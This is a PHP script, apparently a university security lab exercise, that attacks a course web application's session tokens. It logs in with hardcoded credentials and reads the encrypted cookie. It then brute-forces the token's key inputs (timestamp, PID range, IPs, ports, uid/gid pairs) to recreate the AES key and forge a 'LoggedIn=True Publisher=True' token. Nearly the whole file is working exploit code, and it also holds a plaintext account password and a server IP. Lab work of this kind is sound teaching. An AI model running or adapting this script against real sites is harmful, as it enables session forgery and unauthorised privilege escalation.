<?php

// Command line args
// ARG1: LOCAL_SYSTEM_IP
// ARG2: Client port to use

$POSSIBLE_PAIRS = [
  [0,0],
  [1,1],
  [2,2],
  [3,3],
  [4,65534],
  [5,60],
  [6,12],
  [7,7],
  [8,8],
  [9,9],
  [10,10],
  [13,13],
  [33,33],
  [34,34],
  [38,38],
  [39,39],
  [41,41],
  [65534,65534],
  [100,102],
  [101,103],
  [102,104],
  [103,105],
  [104,108],
  [105,65534],
  [106,110],
  [107,65534],
  [108,65534],
  [109,65534],
  [6929,6929],
  [110,115],
  [111,116],
  [112,117],
  [598,598],
  [486,486],
  [10895,1003],
  [3570,1003],
  [4726,1003],
  [230784,1003],
  [10896,6930],
  [113,118],
  [10521,10521]
];

$useragent = "FAKE_USER_AGENT";
$config_data = array(
  "server_name" =>  "152.2.133.235",
  "user_agent" => "FAKE_USER_AGENT",
  "server_port" => "80",
  "local_port" => $argv[2],
  "local_name" => $argv[1],
  "pid" => "18871",
  "gid" => "33",
  "uid" => "33",
);
$ACCOUNT_URL = "http://comp535-lampvm2.cs.unc.edu/account.php";
$INDEX_URL =  "http://comp535-lampvm2.cs.unc.edu/index.php";
$POSSIBLE_ENCRYPTED = [
  "== SecureToken LoggedIn=True Publisher=False ==",
  "== SecureToken LoggedIn=True Publisher=True ==",
];
$HEADERS = array(
  "User-Agent"=> "FAKE_USER_AGENT"
);
$CREDS = array(
  "user" => "RiskyHoneypot",
  "pass" => "YGQVT5Fe0Fh4uQLWiNfnA3hLCyzX0e"
);

/** 
* Send a POST requst using cURL 
* @param string $url to request 
* @param array $post values to send 
* @param array $options for cURL 
* @return string 
*/ 
function curl_post($url, array $post = NULL, array $options = array(), array $cookies = array()) 
{ 
    $cookiestring = "";
    foreach ($cookies as $name => $content) {
      $cookiestring .= $name . "=" . $content . ";";
    }
    echo "Sending request with cookies: " . $cookiestring . "\n";
    global $config_data, $useragent;
    $defaults = array( 
        CURLOPT_POST => 1, 
        CURLOPT_LOCALPORT => $config_data['local_port'],
        CURLOPT_HEADER => 1, 
        CURLOPT_URL => $url, 
        CURLOPT_FRESH_CONNECT => 1, 
        CURLOPT_RETURNTRANSFER => 1, 
        CURLOPT_FORBID_REUSE => 1, 
        CURLOPT_COOKIE => $cookiestring,
        CURLOPT_TIMEOUT => 4, 
        CURLOPT_POSTFIELDS => http_build_query($post),
        CURLOPT_USERAGENT => $useragent
    ); 

    $ch = curl_init(); 
    curl_setopt_array($ch, ($options + $defaults)); 
    if( ! $result = curl_exec($ch)) 
    { 
        trigger_error(curl_error($ch)); 
    } 
    // echo $result;
    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
    $cookies = array();
    foreach($matches[1] as $item) {
        parse_str($item, $cookie);
        $cookies = array_merge($cookies, $cookie);
    }
    echo "\n Dumping cookies returned...\n ";
    var_dump($cookies);
    curl_close($ch); 
    return array(
      "text"=>$result,
      "cookies"=>$cookies
      );
} 

/** 
* Send a GET requst using cURL 
* @param string $url to request 
* @param array $get values to send 
* @param array $options for cURL 
* @return string 
*/ 
function curl_get($url, array $get = NULL, array $options = array(), array $cookies = array()) 
{    
    $cookiestring = "";
    foreach ($cookies as $name => $content) {
      $cookiestring .= $name . "=" . $content . ";";
    }
    echo "Sending request with cookies: " . $cookiestring . "\n";
    global $config_data, $useragent;
    $defaults = array( 
        CURLOPT_URL => $url. (strpos($url, '?') === FALSE ? '?' : ''). http_build_query($get), 
        CURLOPT_HEADER => 1, 
        CURLOPT_RETURNTRANSFER => TRUE, 
        CURLOPT_TIMEOUT => 4,
        CURLOPT_USERAGENT => $useragent,
        CURLOPT_COOKIE => $cookiestring,
    ); 
    
    $ch = curl_init(); 
    curl_setopt_array($ch, ($options + $defaults)); 
    if( ! $result = curl_exec($ch)) 
    { 
        trigger_error(curl_error($ch)); 
    } 
    // echo $result;
    preg_match_all('/^Set-Cookie:\s*([^;]*)/mi', $result, $matches);
    $cookies = array();
    foreach($matches[1] as $item) {
        parse_str($item, $cookie);
        $cookies = array_merge($cookies, $cookie);
    }
    curl_close($ch); 
    return array(
      "text"=>$result,
      "cookies"=>$cookies
      );
} 

// Log out...
$resp = curl_get($INDEX_URL, array("logout" => "True"), array());
if (strpos($resp['text'], "Please log in to obtain more details about the project.") === False){
  echo $resp['text'];
  echo "Logout failed...\n";
  exit(1);
} else {
  echo "Logged out...\n";
}

// Log back in, and a new token will be generated...
$generation_time = time();
$resp = curl_post($INDEX_URL, $CREDS, array(), array());
if (!strpos($resp['text'], "Please log in to obtain more details about the project.") === False){
  echo $resp['text'];
  echo "Login failed...\n";
  exit(1);
} else {
  echo "Logged in!\n";
}

// Fetch the encrypted token from the response..
$array_keys = array_keys($resp['cookies']);
$string_to_match = $resp['cookies'][$array_keys[1]];
echo "The string to match is " . $string_to_match . "\n";

// Send another request to be sure we are still logged in.
$resp = curl_get($INDEX_URL, array(), array(), $resp['cookies']);
if (strpos($resp['text'], "Please log in to obtain more details about the project.") === false){
  echo "Still logged in...\n";
} else {
  echo "We were logged out, something went wrong...\n";
}

// Verify that our tokens have persisted through this request...
// if (strcmp($string_to_match, $resp['cookies'][$array_keys[1]])){
//   echo "They were not the same string..." . $resp['cookies'][$array_keys[1]] . "\n";
//   exit(1);
// }

// Iterate over all PIDs and see if we can get a match...
$done = False;
for ($i = 0; $i <= 32768; $i++) { 
  if ($done){
    break;
  }
  foreach ($POSSIBLE_PAIRS as $pair){
    if ($done){
      break;
    }
    // make a key for each gid/uid pair
    $key = '';
    $key .= '::' . $generation_time;            // known
    $key .= '::' . $useragent;                  // forced known
    $key .= '::' . $i;                          // Pid max confirmed from /proc/sys/kernel/pid_max
    $key .= '::' . $config_data['server_name']; // known
    $key .= '::' . $config_data['server_port']; // known
    $key .= '::' . $config_data['local_name'];  // MY IP
    $key .= '::' . $config_data['local_port'];  // forced known
    $key .= '::' . $pair[0];         // unsure
    $key .= '::' . $pair[1];         // unsure
    // echo "Key: " . $key . "\n";
    $key = md5($key, True);
    $iv = md5($key, True);

    foreach ($POSSIBLE_ENCRYPTED as $value) {
      $candidate = openssl_encrypt($value, 'aes-128-cbc', $key, False, $iv);
      if (!strcmp($candidate, $string_to_match)){
        //found it.....
        echo $candidate . " == " . $string_to_match . "\n";
        echo $i . "\n";
        $done = True;
        break;
      } else {
        // echo $candidate . " != " . $string_to_match . "\n";
        // echo $candidate . "\n";
      }
    }
  }
}
echo "Key not found...\n";

?>